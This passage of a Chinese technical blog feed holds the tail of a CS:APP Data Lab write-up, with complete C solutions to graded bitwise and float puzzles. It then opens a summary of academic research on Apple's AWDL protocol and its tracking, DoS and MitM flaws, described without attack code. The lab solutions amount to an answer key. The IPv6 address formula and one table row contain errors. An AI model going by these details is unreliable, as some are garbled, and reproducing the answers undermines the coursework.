class="type">int</span> <span class="title function_">isPositive</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> isZero = !x;</span><br><span class="line">    <span class="keyword">return</span> !((x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>) &amp; !isZero;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h2><p>判断一个数是否小于等于另一个数，例如<code>isLessOrEqual(4,5) = 1</code>。允许的操作符为<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>，最大操作符数量为 24，等级为 3。</p><p>根据不等式的性质可以将 <code>x &lt;= y</code> 转化为 <code>0 &lt;= y-x</code>，就是需要判断<code>y-x</code> 是不是负数，其中 <code>-x</code> 可以表示为<code>~x+1</code>，但是要分三种情况：</p><ol><li>x 和 y 同号，直接做减法不会溢出。</li><li>x 和 y 异号，可能会发生溢出。该情况下若 x 为负数，则肯定返回 1，否则肯定返回 0。</li><li>x 和 y 相等。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0</span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">    <span class="type">int</span> diffSign = !(x &gt;&gt; <span class="number">31</span>) ^ !(y &gt;&gt; <span class="number">31</span>);</span><br><span class="line">    <span class="keyword">return</span> (diffSign &amp; (x &gt;&gt; <span class="number">31</span>)) | (!diffSign &amp; !((y + (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ilog2"><a href="#ilog2" class="headerlink" title="ilog2"></a>ilog2</h2><p>返回以 2 为底的 log(x)，其中<code>x &gt; 0</code>，例如<code>ilog2(16) = 4</code>。允许的操作符为<code>! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</code>，最大操作符数量为 90，等级为 4。</p><p>此题解法来自<a href="https://stackoverflow.com/questions/21442088/computing-the-floor-of-log-2x-using-only-bitwise-operators-in-c">stackoverflow</a></p><p>可以用公式表示为</p><p>$$log_2(x) = 16<em>a + 8</em>b + 4<em>c + 2</em>d + 1*e (a,b,c,d,e = 0 or 1)$$</p><p>依次求出 abcde 即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ilog2 - return floor(log base 2 of x), where x &gt; 0</span></span><br><span class="line"><span class="comment"> *   Example: ilog2(16) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 90</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ilog2</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j, k, l, m;</span><br><span class="line">    x = x | (x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    x = x | (x &gt;&gt; <span class="number">2</span>);</span><br><span class="line">    x = x | (x &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    x = x | (x &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    x = x | (x &gt;&gt; <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// i = 0x55555555</span></span><br><span class="line">    i = <span class="number">0x55</span> | (<span class="number">0x55</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    i = i | (i &lt;&lt; <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// j = 0x33333333</span></span><br><span class="line">    j = <span class="number">0x33</span> | (<span class="number">0x33</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    j = j | (j &lt;&lt; <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// k = 0x0f0f0f0f</span></span><br><span class="line">    k = <span class="number">0x0f</span> | (<span class="number">0x0f</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    k = k | (k &lt;&lt; <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// l = 0x00ff00ff</span></span><br><span class="line">    l = <span class="number">0xff</span> | (<span class="number">0xff</span> &lt;&lt; <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// m = 0x0000ffff</span></span><br><span class="line">    m = <span class="number">0xff</span> | (<span class="number">0xff</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    x = (x &amp; i) + ((x &gt;&gt; <span class="number">1</span>) &amp; i);</span><br><span class="line">    x = (x &amp; j) + ((x &gt;&gt; <span class="number">2</span>) &amp; j);</span><br><span class="line">    x = (x &amp; k) + ((x &gt;&gt; <span class="number">4</span>) &amp; k);</span><br><span class="line">    x = (x &amp; l) + ((x &gt;&gt; <span class="number">8</span>) &amp; l);</span><br><span class="line">    x = (x &amp; m) + ((x &gt;&gt; <span class="number">16</span>) &amp; m);</span><br><span class="line">    x = x + ~<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Floating-Point-Operations"><a href="#Floating-Point-Operations" class="headerlink" title="Floating-Point Operations"></a>Floating-Point Operations</h1><h2 id="float-neg"><a href="#float-neg" class="headerlink" title="float_neg"></a>float_neg</h2><p>返回 uf 的相反数，如果 uf 是 NaN 则返回自身。允许使用条件与循环语句。允许使用任何 int 与 unsigned 操作符。最大操作符数量为 10，等级为 2。</p><p>可以直接修改符号位返回相反数。另外如果 uf 的指数位为 0xff 并且小数位非 0 时，uf 为 NaN，因此就需要判断 uf 的绝对值是否大于 0x7f800000。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * float_neg - Return bit-level equivalent of expression -f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representations of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">float_neg</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">    <span class="type">int</span> mask = <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">if</span> ((uf &amp; ~mask) &gt; (<span class="number">0xFF</span> &lt;&lt; <span class="number">23</span>))</span><br><span class="line">        <span class="keyword">return</span> uf;</span><br><span class="line">    <span class="keyword">return</span> uf ^ mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="float-i2f"><a href="#float-i2f" class="headerlink" title="float_i2f"></a>float_i2f</h2><p>将一个整数转换为浮点数表示的形式。允许使用条件与循环语句，允许使用任何 int 和 unsigned 操作符。。最大操作符数量为 30，等级为 4。</p><p>浮点数的表示主要有三个部分：符号位 sign，指数位 exp 和小数位 frac。首先找到符号位后将 x 取绝对值 (符号位归 0)，通过右移找到 x 最高位的 1 的位置(找到 x 的 2 的最高次方) 再加 127 就得到指数位 exp，之后就需要计算小数位 frac，由于 int 有 31 位，而浮点数小数位只有 23 位存放数据，因此从 int 转为 float 会丢失 8 位的精度，这时就需要对小数位向偶数舍入。int 类型中有两个特殊值：0 和 0x80000000，这两个特殊值不能通过移位计算指数位与小数位因此要单独处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * float_i2f - Return bit-level equivalent of expression (float) x</span></span><br><span class="line"><span class="comment"> *   Result is returned as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">float_i2f</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> sign, <span class="built_in">exp</span>, frac, bitc, tailb;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (x == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (x == <span class="number">0x80000000</span>) <span class="keyword">return</span> <span class="number">0xCF000000</span>;</span><br><span class="line"></span><br><span class="line">    sign = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line">    <span class="keyword">if</span> (sign) x = -x;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// count bits to the right of MSB</span></span><br><span class="line">    bitc = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ((x &gt;&gt; bitc) != <span class="number">0</span>)</span><br><span class="line">        bitc++;</span><br><span class="line">    bitc--;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exp</span> = bitc + <span class="number">127</span>;</span><br><span class="line"></span><br><span class="line">    x = x &lt;&lt; (<span class="number">31</span> - bitc); <span class="comment">// clear all those zeros to the left of MSB</span></span><br><span class="line">    frac = (x &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x7FFFFF</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// round to even (nearest)</span></span><br><span class="line">    <span class="keyword">if</span> (bitc &gt; <span class="number">23</span>) &#123;</span><br><span class="line">        tailb = x &amp; <span class="number">0xFF</span>; <span class="comment">// byte to round</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((tailb &gt; <span class="number">128</span>) || ((tailb == <span class="number">128</span>) &amp;&amp; (frac &amp; <span class="number">1</span>))) &#123;</span><br><span class="line">            frac += <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (frac &gt;&gt; <span class="number">23</span>) &#123;</span><br><span class="line">                <span class="built_in">exp</span> += <span class="number">1</span>;</span><br><span class="line">                frac = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (sign &lt;&lt; <span class="number">31</span>) | (<span class="built_in">exp</span> &lt;&lt; <span class="number">23</span>) | frac;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="float-twice"><a href="#float-twice" class="headerlink" title="float_twice"></a>float_twice</h2><p>返回浮点数 uf 乘 2 的结果，如果 uf 为 NaN 则返回自身。允许使用条件与循环语句，允许使用任何 int 和 unsigned 操作符。最大操作符数量为 30，等级为 4。浮点数乘 2 其实就是将 exp 加 1，但是需要单独处理一些特殊情况，例如 NaN，正负 0(0x0, 0x80000000)和非规格化的浮点数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * float_twice - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">float_twice</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">    <span class="type">int</span> mask = (<span class="number">0x1</span> &lt;&lt; <span class="number">31</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((uf &amp; ~mask) &gt;= (<span class="number">0xFF</span> &lt;&lt; <span class="number">23</span>))</span><br><span class="line">        <span class="keyword">return</span> uf;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((uf &amp; (<span class="number">0xFF</span> &lt;&lt; <span class="number">23</span>)) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> (uf &amp; ~(<span class="number">0x1FF</span> &lt;&lt; <span class="number">23</span>)) &lt;&lt; <span class="number">1</span> | (uf &amp; mask);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> uf + (<span class="number">1</span> &lt;&lt; <span class="number">23</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ComputerScience </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWDL 协议及漏洞分析</title>
      <link href="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Milan Stute, David Kreitschmann, and Matthias Hollick. One Billion Apples’ Secret Sauce: Recipe for the Apple Wireless Direct Link Ad hoc Protocol. The 24th Annual International Conference on Mobile Computing and Networking (MobiCom ’18), October 29–November 2, 2018, New Delhi, India. ACM. Best Community Paper Award. doi:10.1145/3241539.3241566</p><p>Milan Stute, Sashank Narain, Alex Mariotto, Alexander Heinrich, David Kreitschmann, Guevara Noubir, and Matthias Hollick. A Billion Open Interfaces for Eve and Mallory: MitM, DoS, and Tracking Attacks on iOS and macOS Through Apple Wireless Direct Link. 28th USENIX Security Symposium (USENIX Security ’19), August 14–16, 2019, Santa Clara, CA, USA.</p><p>本文章主要涉及以上两篇论文的总结与归纳，其中第一篇论文作者主要通过逆向对 AWDL 协议进行分析与测试，第二篇论文作者通过对 ADWL 进行安全性分析，发现了四个高危漏洞。另外本文章主要关注于 AWDL 协议与其漏洞内容，不涉及讨论对 AWDL 协议具体的逆向过程与效率分析结果。</p></blockquote><h1 id="背景简介"><a href="# 背景简介" class="headerlink" title="背景简介"></a>背景简介 </h1><p> 基于苹果无线直连（Apple Wireless Direct Link, AWDL）协议的 AirDrop 与 AirPlay 广泛在苹果生态中的操作系统里使用，包括 iOS，MacOS，WatchOS 等等。通过 AWDL 协议使得数十亿不同的苹果设备之间可以无需连接无线接入点就很方便的互相传递信息。随着 AWDL 协议的广泛使用，该协议也牵涉很多用户的隐私，因此协议安全性是至关重要的，原论文作者首次对 AWDL 协议与其低功耗蓝牙（Bluetooth Low Energy, BLE）集成进行安全性分析与代码逆向，通过分析逆向结果，作者发现了一些不同类型的安全漏洞：</p><ol><li>设备长期跟踪，使得 MAC 地址随机化无效，可能会泄露设备所有者的个人信息。</li><li>针对与 AWDL 协议机制，通过去同步目标的信道从而阻止目标设备通信，形成 DOS 攻击。</li><li>可造成中间人攻击，篡改通过 AirDrop 发送的文件。</li><li>对 WIFI 驱动中的 AWDL 协议可以进行两次 DOS 攻击，该 DOS 攻击可以针对单一目标设备或者周围所有设备。</li></ol><p>作者针对以上四个安全漏洞制作了 POC，并且演示了通过 20$ 的 micro:bit 设备与无线网卡即可实施攻击。</p><h1 id="AWDL 协议"><a href="#AWDL 协议" class="headerlink" title="AWDL 协议"></a>AWDL 协议 </h1><p> 苹果无线直连 AWDL 协议是基于 IEEE 802.11 标准的苹果公司专利无线 AD-Hoc（点对点）通讯协议，苹果公司于 2014 年首次将该协议整合进包括 iPhone 与 Mac 的产品线中，具体实现体现在 AirDrop 与 AirPlay 等应用中，无需连接 AP，可以很方便的实现信息点对点跨设备传输。原论文作者在 2018 年首次对该协议进行逆向，通过代码静态分析与运行时分析解析该协议框架内容与帧格式，编写了可以解析 AWDL 帧的 WireShark 解析器。</p><h2 id="帧类型与结构"><a href="# 帧类型与结构" class="headerlink" title="帧类型与结构"></a>帧类型与结构 </h2><p>AWDL 协议主要有两种帧：动作帧(Action Frame, AF) 与数据帧(Data Frame, DF)，其中动作帧主要用于网络节点同步，主节点选举等，数据帧主要用于数据的传输。</p><h3 id="动作帧"><a href="# 动作帧" class="headerlink" title="动作帧"></a>动作帧 </h3><p> 动作帧 (Action Frame) 的帧结构如图所示，动作帧基于 802.11 的基础帧结构的扩展，除了 802.11 的基础帧结构，额外由一个固定长度的报头与多个 TLV 字段构成。</p><p><img src="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/af.jpg"></p><p>动作帧中各字段解释如下表所示</p><table><thead><tr><th>字段</th><th>长度(Byte)</th><th>说明</th></tr></thead><tbody><tr><td>Type/Subtype</td><td>2</td><td>指定该 802.11 帧的类型或子类型</td></tr><tr><td>Duration</td><td>2</td><td>恒为 0，表示预计占用信道的时间</td></tr><tr><td>Destination Address</td><td>6</td><td>接收该帧的目的 MAC 地址</td></tr><tr><td>Source Address</td><td>6</td><td>发送该帧的源 MAC 地址</td></tr><tr><td>BSSID</td><td>6</td><td>AP 的 MAC 地址，这里表示集群中主节点的地址，在 AWDL 协议中恒为 00:25:00:ff:94:73</td></tr><tr><td>Sequence/Fragment no.</td><td>2</td><td>帧序列号与帧片段编号</td></tr><tr><td>Cat.</td><td>1</td><td>作者未解释，在 AWDL 协议中恒为 0x7f</td></tr><tr><td>OUI</td><td>3</td><td>组织唯一标识符(Organization Unique Identifier, OUI)，由芯片供应商提供，苹果公司分配到的为 00:17:f2</td></tr><tr><td>Type</td><td>1</td><td>恒为 8</td></tr><tr><td>Version</td><td>1</td><td>该动作帧的版本，目前为 1.0</td></tr><tr><td>Subtype</td><td>1</td><td>动作帧的子类型，包含周期同步帧 (0) 和主指标广播帧(3)</td></tr><tr><td>Reversed</td><td>1</td><td>保留位，恒为 0</td></tr><tr><td>Phy Tx Time</td><td>4</td><td>用于同步的时间戳，表示该帧的创建时间</td></tr><tr><td>Target Tx Time</td><td>4</td><td>用于同步的时间戳，表示该帧进入传输队列的时间</td></tr><tr><td>TLVs</td><td>&gt;4</td><td>TLV 里包含了动作帧的控制信息，一个动作帧后会附着若干个 TLV 字段，该字段由 1 字节 type 子字段与 2 字节 length 子字段，length 子字段代表后续的 value 子字段长度</td></tr></tbody></table><p>动作帧分为两种子类型，由 Subtype 字段指示</p><ul><li>周期同步帧(Periodic Synchronization Frame, PSF)：Subtype 字段为 0，主要用于设备之间的同步。</li><li>主指标广播(Broadcast Master Indication Frame, MIF)：Subtype 字段为 3，用于主节点选举或服务发现。</li></ul><p>动作帧主要通过若干个 TLV 字段来传递控制信息，TLV 可用于选举，同步，服务发现和用户数据传输。部分常用 TLV 的说明如下表所示，各 TLV 的名称来源作者静态分析的结果。</p><p><img src="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/tlv.jpg"></p><p>Version TLV 中提供的版本号将会替换掉动作帧字段中的 Version 字段。Version TLV 包含了 AWDL 的版本和设备 ID，设备 ID 用以对操作系统进行区分，macOS 10.13 和 ios 11 使用 v3 版本，macOS 10.12 和 ios 10 使用 v2 版本，macOS 10.11 使用了 v1 版本。</p><h3 id="数据帧"><a href="# 数据帧" class="headerlink" title="数据帧"></a>数据帧</h3><p>AWDL 使用 802.11 的数据帧进行用户数据传输。其帧结构如下图所示。</p><p><img src="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/df.jpg"></p><p>DSAP 字段之前的各字段与动作帧中的字段含义相同，其余各字段解释如下</p><table><thead><tr><th>字段</th><th>长度(Byte)</th><th>说明</th></tr></thead><tbody><tr><td>DSAP</td><td>1</td><td>目标服务访问点，恒为 0xaa</td></tr><tr><td>SSAP</td><td>1</td><td>源服务访问点，恒为 0xaa</td></tr><tr><td>Ctrl</td><td>1</td><td>控制位，恒为 0x03</td></tr><tr><td>OUI</td><td>3</td><td>与动作帧相同，恒为 00:17:f2</td></tr><tr><td>Protocol ID</td><td>2</td><td>协议 ID，恒为 0x0800</td></tr><tr><td>Magic Byte</td><td>2</td><td>魔术字节，恒为 0x0304</td></tr><tr><td>Sequence Number</td><td>2</td><td>数据帧序列号</td></tr><tr><td>Protocol ID</td><td>2</td><td>与动作帧相同，恒为 00:17:f2</td></tr><tr><td>Reversed</td><td>2</td><td>保留位，恒为 0</td></tr><tr><td>EtherType</td><td>2</td><td>以太网协议类型，恒为 0x86dd，代表使用 IPV6 协议</td></tr></tbody></table><h2 id="节点寻址"><a href="# 节点寻址" class="headerlink" title="节点寻址"></a>节点寻址 </h2><p> 苹果使用 MAC 地址随机化以保护用户隐私，每次接口被激活时将会生成一个随机的 MAC 地址。AWDL 协议为了在网络集群中确定一个节点的 IPV6 地址需要使用网络层的协议解决，苹果采用了 RFC 4291[19, Appendix A]中的算法使用动作帧中的源 MAC 地址生成本地 IPV6 地址。简单来说，对于一个给定的 MAC 地址<code>u:v:w:x:y:z</code>，生成的 IPV6 地址为<code>fe:80::u^0x02:v:w:ff::fe:x:y:z</code>。当一个节点收到了第一个动作帧以后就可以根据该帧中的源地址计算出源地址的 IPV6 地址并且将其加入的地址表中，无需使用其他地址解析协议。</p><h2 id="协议内容"><a href="# 协议内容" class="headerlink" title="协议内容"></a>协议内容 </h2><p> 简而言之，每个 AWDL 集群中的节点都会定期广播一系列包含自己可用窗口 (Availability Window, AW) 的动作帧以表示该节点可与其他节点进行通信，之后集群中将会选举出一个主节点，该主节点的作用是使集群中的其他节点保持同步，此外 AWDL 协议还可以使用信道跳变将 AP 调整到其他信道同时与其他节点进行通信，AWDL 还能够处理集群的节点随时退出。</p><h3 id="主节点选举"><a href="# 主节点选举" class="headerlink" title="主节点选举"></a>主节点选举 </h3><p> 主节点在集群中是唯一的，其作用就是使集群中所有的从节点保持时钟同步，主节点广播其时钟信号，从节点收到信号后同步自己的时钟。此外由于集群网络中主节点到某从节点之间可能无法直接到达，需要经过多个从节点，因此该路径上的从节点将临时扮演主节点，称为“非选举主节点”，重复主节点发出的时钟信号，此外，非选举主节点将使用 Synchronization Tree TLV 宣布自己到主节点之间的路径。</p><p>一个集群可以抽象为一个无向树，当非选举主节点传递时钟信号时可能会在树中遇到环，从而发生传递死循环，如下图所示，主节点的目标是同步 Node4，但是 Node4 还通向 Node3，因此 Node1 到 Node4 将轮流作为非选举主节点向相邻的 Node 同步，造成循环。为了解决这个问题，每个动作帧中都包含一个 Synchronization Tree TLV，其中保存了所有节点到主节点的列表，如果一个节点发现自己已经在通往目标节点的路径上时将拒接接收非选举主节点的时钟信号，例如 Node3 已经由 Node1 同步，但是发现自己位于通向 Node4 的路径上，因为来自 Node1 的同步信号将早于来自 Node4 的同步信号，因此将会拒绝接收来自 Node4 的同步。</p><p><img src="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/c.jpg"></p><p>每个激活了 AWDL 接口的集群节点将会使用 Election Parameters v2 TLV 广播其主指标，集群中主指标最大的节点将被选举为主节点。主指标是一个度量值，苹果在其专利中宣称该值的选择取决于设备电量，CPU 负载，信号强度等因素，但是原论文作者在测试时发现这个度量值只是随机选择的。</p><p>选举的具体操作为：激活了 AWDL 接口的节点将主指标初始值设置为 60 进行广播（使用一个很小的初始值 60 是为了避免当一个新节点加入集群中时整个集群重新进行选举），之后该节点监听主节点信道 2 秒，如果没有发现集群中存在主节点，那么该节点将会从指定的范围中随机选取一个随机数，对于 v2 版本，该范围为 405 到 436，对于 v3 版本，该范围为 505 到 536，随着版本增加随机数范围的增加可以保证集群中被选举出的主节点都是最新版本的，并且可以向后兼容。此外，原论文作者在测试时发现每个节点不管集群中是否已经存在了一个主节点，只在很短的时间里维护自己的主指标，之后便从范围中选取一个更高的随机数作为新的主指标，除了主指标节点还会维护一个计数器，该计数器的作用就是实现选取更高的随机数(主指标 = 随机数 + 计数器)，并且该计数器的值将会随着主节点选举结束后随时间线性增长，这表明一个已经存在的主节点可能会被另一个运行相同版本 AWDL 的节点替换掉。</p><p>当两个不同的集群相互接近时，AWDL 会对这两个集群进行合并，由于所有的节点都使用 Election Parameters TLV 广播主指标，当一个集群中的主节点发现另一个集群的主节点发送的主指标时，主指标更高的主节点将会成为集群合并后的主节点。</p><p>当主节点离开集群后，由于主节点不会再继续主动发送动作帧以保持集群同步，因此其他节点会经过一定的超时时间后（96 个可用窗口时间，大约 1.5 秒）检测到丢失主节点，这时集群会进行重新选举，另一个节点将会取代原来的主节点，由于该节点已经与原来的主节点同步过，所以整个其他从节点无需再次同步，只需修改自己帧里面的主节点地址即可，可以实现主节点离群后重新选举的无缝衔接。</p><h3 id="同步"><a href="# 同步" class="headerlink" title="同步"></a>同步 </h3><p> 在选举出主节点的集群中，每一个从节点都将与主节点进行时间同步。AWDL 中存在可用窗口作为时间同步的最小划分。可用窗口 (Availability Window, AW) 表示设备可以进行通信的一段固定时间，AWDL 协议基于单位时间 (Time Unit, TU) 计时，1TU=1024 μs，而每一个 AW 的时长为 16TU，该值使用 Synchronization Parameters TLV 进行传递。为了降低性能功耗，节点不会监听每一个 AW，而是以 4 个窗口为一个监听周期，第一个窗口为 AW，后三个窗口被称为扩展窗口(Extension Window，EW)，EW 的长度与 AW 相同。在 AWDL 